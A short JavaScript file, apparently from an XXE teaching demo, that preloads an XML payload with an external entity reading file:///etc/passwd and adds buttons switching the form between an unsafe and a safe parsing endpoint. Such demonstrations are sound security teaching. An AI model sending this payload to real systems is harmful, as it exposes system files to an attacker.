 const attackXML = `
      <!DOCTYPE read-fs [<!ELEMENT read-fs ANY >
      <!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
      <users>
	<user>
	  <read-fs>&passwd;</read-fs>
	  <name>C.K Frode</name>
	</user>
      </users>`;

 $(() => {
   $('#attack-xml')
     .val(attackXML)
     .after(
       $('<button>')
	 .text('Unsafe')
	 .attr('type', 'button')
	 .addClass('is-safe left btn btn-default active')
	 .on('click', ( e ) => {
	   const elem = $(e.target);
	   const form = elem.closest('form');

	   elem.addClass('active');
	   elem.siblings('.is-safe').removeClass('active');
	   form.attr('action', '/xxe/unsafe');
	 }),
       $('<button>')
	 .text('Safe')
	 .attr('type', 'button')
	 .addClass('is-safe right btn btn-default')
	 .on('click', ( e ) => {
	   const elem = $(e.target);
	   const form = elem.closest('form');

	   elem.addClass('active');
	   elem.siblings('.is-safe').removeClass('active');
	   form.attr('action', '/xxe/safe');
	 }));
 });
